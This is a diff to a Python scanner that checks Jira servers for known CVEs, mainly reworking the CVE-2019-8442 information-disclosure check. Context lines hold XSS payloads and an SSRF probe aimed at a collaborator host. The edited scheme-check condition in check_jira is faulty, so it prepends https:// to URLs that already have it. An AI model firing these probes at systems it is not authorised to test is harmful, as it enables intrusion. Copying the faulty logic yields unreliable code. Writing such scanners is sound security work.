@@ -82,7 +82,7 @@ def JIRA_TestCases(url):
     jupf = f"{url}secure/ManageFilters.jspa?filter=popular&filterView=popular"
     xss = f"{url}pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm"
     cve20193403 = f"{url}rest/api/2/user/picker?query=admin"
-    cve20198442 = f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
+    cve20198442_url = f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
     cve20179506 = f"{url}plugins/servlet/oauth/users/icon-uri?consumerUri={collaborator}"
     cve20193402 = f"{url}secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search"
     cve20182082 = f"{url}plugins/servlet/Wallboard/?dashboardId"
@@ -410,13 +410,49 @@ def JIRA_TestCases(url):
     except:
         pass 
 
+    
     #CVE-2019-8442
-    try:
-        response = requests.get(cve20198442, verify=False)
-        if response.status_code == 200 in response.text:
-            vulnerabilities.append(f"+ CVE-2019-8442 [Information Disclosure] : https://jira.atlassian.com/browse/JRASERVER-69241 visit the affected url,the server will leaking some server's information | URL : {cve20198442}")
-    except:
-        pass 
+    def check_cve_2019_8442(url):
+        print(f"{Fore.YELLOW}\nINFO: Checking for CVE-2019-8442")
+    # List of URLs to check
+        urls_to_check = [
+            f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
+            f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml",
+            f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties",
+    ]
+    
+        for target_url in urls_to_check:
+            print(f"{Fore.YELLOW}\n- Checking URL: {target_url}")
+            try:
+                # Stream response to handle large files
+                response = requests.get(target_url, verify=False, allow_redirects=False, stream=True)
+                print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}")
+            
+                if response.status_code == 200:
+                    # Check content for "dependency" keyword
+                    contains_dependency = False
+                    for chunk in response.iter_lines(decode_unicode=True):
+                        if "dependency" in chunk:
+                            contains_dependency = True
+                            break  # Stop further processing if keyword is found
+                
+                    if contains_dependency:
+                        vulnerabilities.append(f"+ CVE-2019-8442 [Information Disclosure] : https://jira.atlassian.com/browse/JRASERVER-69241 visit the affected url,the server will leaking some server's information | URL : {target_url}")
+                        print(f"{Fore.GREEN}+ CVE-2019-8442 Detected: Information Disclosure vulnerability found!{Style.RESET_ALL}")
+                        print(f"  URL: {target_url}")
+                        #print(f"  Visit the URL for more details: https://jira.atlassian.com/browse/JRASERVER-69241")
+                    else:
+                        print(f"{Fore.BLUE}- NEEDS MANUAL REVIEW - No sensitive information detected at {target_url}{Style.RESET_ALL}")
+                elif response.status_code == 302:
+                    print(f"{Fore.YELLOW}- Possible Redirection Detected (302): {target_url}{Style.RESET_ALL}")
+                    print(f"  Response text: {response.text}")
+                else:
+                    print(f"{Fore.BLUE}- No vulnerability detected at {target_url}{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}* An error occurred while checking {target_url}: {e}{Style.RESET_ALL}")
+
+    check_cve_2019_8442(url)
+ 
 
     #CVE-2017-9506
     try:
@@ -466,6 +502,7 @@ def JIRA_TestCases(url):
     else:
         print("- No vulnerabilities were found.")
 
+
 def parse_jira_response(response_text):
     try:
         # Parse the JSON response
@@ -491,8 +528,10 @@ def parse_jira_response(response_text):
         print(f"Error parsing JSON response: {e}")
 
 def check_jira(url, path):
-    if not url.startswith("http") or not url.startswith("https"):
+    if not url.startswith("http") or url.startswith("https"):
         url = "https://" + url
+    else:
+        url = url
         print(f"{Fore.YELLOW}[Scanning] : " + url + f"{Style.RESET_ALL}")
         #print(url)
 
